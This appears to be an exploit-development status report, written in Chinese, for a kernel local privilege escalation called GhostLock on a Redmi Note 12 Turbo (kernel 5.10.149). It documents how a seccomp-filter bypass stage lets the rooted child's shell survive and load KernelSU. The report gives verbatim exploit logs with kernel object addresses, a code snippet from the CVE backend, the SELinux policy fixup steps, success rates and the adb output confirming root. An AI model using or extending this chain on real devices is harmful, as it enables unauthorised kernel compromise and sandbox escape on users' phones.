# Device gate: marble 5.10.149 — root shell 被自家 seccomp 打死（W3 必须开）

## 结论

在 Redmi Note 12 Turbo（marble，`3e6f1443`，内核 `5.10.149-android12-9-00001-gda3d81545d1d-ab9545656`）上：

**`w3_attempts = 0`（把 W3 关掉）会让 rooted child 的 handoff root shell 在 `execve` 之后立刻被 `SIGSYS`
杀死，根脚本一行都不执行 —— uid=0 拿到了，但 root 是哑的。**

把 `w3_attempts` 改回 `1` 后，同一套 native 代码在一次 run 内跑完 W1 → W2 → W3 → handoff：

```
[+] child is root!
W3-0: leaf dir attempt 1/4  →  W3: TIF_SECCOMP+mode attempt 1/1
[+] child seccomp fully bypassed (forked workers run filter-free)
[*] root script start uid=0 euid=0
[*] late-load kmi=android12-5.10  →  [*] late-load exit=0
[+] KernelSU module loaded
[+] KernelSU ready
```

外部可验证的终态：

```sh
$ adb -s 3e6f1443 shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

⇒ **App 内一次性拿到可用的 KernelSU root（全程只用手机，无 PC 参与）。** 这是本移植项目第一次到达
「root 可用」而非仅「uid=0」。

## 判据

| 项 | 本次 |
| --- | --- |
| 设备 | `3e6f1443`（marble / SM7475 / MIUI V14.0.27.0.TMRCNXM / kernel `5.10.149-android12-9-00001-gda3d81545d1d-ab9545656`） |
| 驱动脚本 | 自制 `build/probe_handoff.ps1`（冷启动 → 唤醒 → 清日志与探针 → `am start` → 点击执行 → 轮询；HIT 后导出证据） |
| 时间 | 2026-10-15 18:19:49 – 18:20:24（第 1 次尝试即命中） |
| profile | `w3_chain_rounds = 1` / `w3_attempts = 1` / `w3_settle_us = 50000`（本轮由 `0` 改为 `1`） |
| native | `build/native/ghostlock` md5 `197AED81A4B23459E97833A82D5A7579`（2784608 B，2026-10-15 18:10:20） |
| APK | `GhostLock-v1.2(571)-arm64-v8a-debug.apk` md5 `388E472F352D76825224892213FD4B86`（22176965 B，18:19:22） |
| 日志 | 设备 `files/.ghostlock_native.log`（18321 B）、`files/ghostlock-ksu-1792059613794.log`（612 B，根脚本自写） |
| 归档时间 | 2026-10-15 |
| 本地副本 | `build/510profile/probe-handoff.txt`（关 W3 时）、`build/510profile/probe-w3.txt`（开 W3 时，HIT 瞬间快照） |

## 逐字证据

### 1. 关掉 W3 时的死法（`build/510profile/probe-handoff.txt:39-43`）

```
handoff-pre-fork value=0 errno=9
worker-enter value=0 errno=0
worker-script-size value=6200 errno=0
worker-script-read value=32 errno=0
worker-sh-rc value=31 errno=0
```

探针由 `src/core/session/victim_process.cpp` 的 root-shell worker 写出（原始 `open`/`write`/`fsync`，
不走 stdio）：

- `worker-script-size` = `lseek(fd, 0, SEEK_END)` ⇒ **脚本 6200 B，`errno=0`**；
- `worker-script-read` = 同一 fd 上 `read()` 的返回 ⇒ **32 B 真读到了** ⇒ 脚本本身没问题，
  「mksh 把脚本当空文件」这条假设被排除；
- `worker-sh-rc` = `waitpid(2)` 的原始状态 ⇒ **31**，`WIFSIGNALED(31)` 为真 ⇒ 被**信号 31（`SIGSYS`）**
  杀死。同一次探针里 `fork` + `execl("/system/bin/sh", "sh", "-c", …)` 的子进程也拿到 31。

对照：在同一次 run 的 native 日志里，worker 的 `execl("/system/bin/sh", "sh", "-x", <script>)` 是
**成功**的（进程 comm 变成 `sh`），死的是 shell 自己的下一个 syscall。

### 2. 打开 W3 后同一枚探针

`worker-sh-rc value=0`（同一 worker 代码、同一条脚本）⇒ 清掉过滤器的瞬间 shell 就活了。

### 3. W3 与 handoff（设备 `.ghostlock_native.log`，逐字）

```
[*] child uid = 0
[+] child is root!
[*] W3-0: leaf dir attempt 1/4
[*] === W3-0: leaf dir === target=0xffffff87eb45d190 mode=1 leaf=1
[*] W3: TIF_SECCOMP+mode attempt 1/1
[*] === W3: TIF_SECCOMP === target=0xffffff87eb45ca00 mode=1 leaf=1
[*] === W3: seccomp mode === target=0xffffff87eb45d248 mode=1 leaf=1
[*] seccomp finit_module probe = 0x16
[+] child seccomp filter bypassed (finit_module errno=22)
[+] child seccomp fully bypassed (forked workers run filter-free)
[*] handoff: child=21469 alive=1 sent=1 errno=0
[*] handoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] handoff: root shell worker pid=32371
[*] handoff: script open fd=320 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
…
[*] enforce=1 (enforcing)
[+] KernelSU ready
[*] fork-hold parked pid=32449; reclaim sockets survive this exit
```

### 4. 根脚本自己的日志（`files/ghostlock-ksu-1792059613794.log`，612 B，逐字）

```
[*] root script start uid=0 euid=0
[*] seccomp=Seccomp:	0 Seccomp_filters:	0 
[*] ksud=/data/user/0/com.ghostlock.app/files/ksud
[*] ksud_file=-rwx------ 1 u0_a271 u0_a271 4892712 2026-10-15 18:20 /data/user/0/com.ghostlock.app/files/ksud
[*] uname=5.10.149-android12-9-00001-gda3d81545d1d-ab9545656
[*] iomem cache: cached 13599 bytes
[*] fixup: attempt 1
conv=4
1+0 records in
1+0 records out
1 bytes (1 B) copied, 0.000106 s, 9.2 K/s
[*] policyload before=0 after=2
[*] policy fixup rc=0
[*] late-load kmi=android12-5.10
[*] late-load exit=0
[*] temp su uid=0; watching kernelsu.ko
[+] KernelSU module loaded
```

第 2 行是决定性的一行：脚本看到的自己已经是 `Seccomp: 0 Seccomp_filters: 0`。

### 5. 终态（root shell 从设备外部可验证）

```sh
$ adb -s 3e6f1443 shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb -s 3e6f1443 shell "su -c 'ls -la /data/adb/'"
drwxrwxrwx 4 root u39472_a1376_cache 3452 … ksu
-rwxr-xr-x 1 root root              4892712 … ksud

$ adb -s 3e6f1443 shell ls -la /system/bin/su
-rwxr-xr-x 1 root root 4892712 2026-10-15 18:20 /system/bin/su
```

## 机理

1. App 进程（`u:r:untrusted_app:s0`，`Seccomp=2 Seccomp_filters=1`）带的是 zygote 继承下来的
   seccomp filter；rooted child 由它 `fork()`，因此 `sh` 继承同一条 filter。
2. 该 filter 在 `sh` 启动路径上命中的某个 syscall 的 action 是**杀死进程**（`SIGSYS`），
   于是 `execve` 成功、shell 随即死亡 —— 从外面看就是「worker 变成僵尸 `(sh)`，日志里什么都不多」。
3. W3 是唯一清 `TIF_SECCOMP`（`child_task + TASK_THREAD_INFO_FLAGS_OFF`）与
   `seccomp.mode`（`child_task + task_seccomp_off()`）的阶段。P0-2 在
   `src/core/session/backend/cve_2026_43499_backend.cpp` 的 `w3<M>()` 里插的早退

   ```cpp
   if (session.profile.w3_attempts() == 0) {
       pr_warning("W3 disabled by profile (w3_attempts=0); leaving the app seccomp filter armed\n");
       seccomp_ok = 0;
       return true;
   }
   ```

   正好把这条唯一的通道关掉了。
4. W3 的真实代价比当初的预算低得多：本轮三次 pselect（叶子方向探针 1/4、`TIF_SECCOMP` 1/1、
   `seccomp mode` 1/1）**全部一次命中**。按 `waiter_words.cpp` 的表，`w3_attempts = 1` 时上界是
   4（探针）+ 1 + 1 = **6 次 pselect**，不是 13。

## 与既有 gate 的关系

- `2026-10-14-marble-w1-shortcircuit.md:102-103` 的未决 4 写的是「W3 重开需要最多 13 次 pselect，
  在该概率下不可行（这是 `w3_attempts=0` 的直接原因）」。本次测量推翻该估计：`w3_attempts = 1` 时
  W3 只有 3 次 pselect（上界 6 次），且实测一次通过 ⇒ 那条「W3 不可行」的结论作废。
- `docs/analysis/5.10-safe-miss-plan.md` 的「打偏 ⇒ 冻结」问题不受本次改动影响：W3 的写是
  `mode=1 leaf=1`（`fake_right == 0`），走 `src/core/route/waiter_words.cpp` 的
  `relink_pc = right != 0 ? right : write_target - 8` 回退臂，与 W1/W2 的黑节点地毯互不干扰。

## 未决

1. **成功率需重测**：W3 打开后一次完整 run 要 1（W1）+ 1（W2）+ 最多 6（W3）次 pselect 全中。
   W3 关闭时测得 W1 85%（17/20）、W2 82%（14/17）、单次冷启动 70%（14/20）；W3 打开后该数字必然下降，
   批次 `rounds-w3on`（20 轮冷启动、`-RebootAfterHit`）正在测量。
2. **「全程不重启」（m04265）仍未达成**：干净 boot 上打偏即重启（`CONFIG_PANIC_ON_OOPS=y`）；
   已缴械 boot 上打偏会冻结（`docs/analysis/5.10-safe-miss-plan.md`）。
3. 本 gate 只覆盖 **1 次**完整成功 run（18:19–18:20）。同一构建的 PASS/panic/PASS 特性意味着单次成功
   不足以断言稳定性。
4. W3 打开后仍留一个已知缺口：W3 的 `relink_pc` 回退臂（`write_target - 8`）在打偏时指向子任务
   task_struct 内部，未铺黑节点地毯（`5.10-safe-miss-plan.md` §8 只覆盖了 W1 的写值）。
5. 工作树未 commit（`app/src/main/assets/kernel_profiles/5.10.149-…conf`、`src/core/kernel/target.h`、
   `src/core/kernel/target_constants.hpp`、`src/core/memory/payload_builder.cpp`、
   `src/core/session/victim_process.cpp`、`src/core/support/util.cpp`、`tools/trials/trials_ps4.ps1`）。
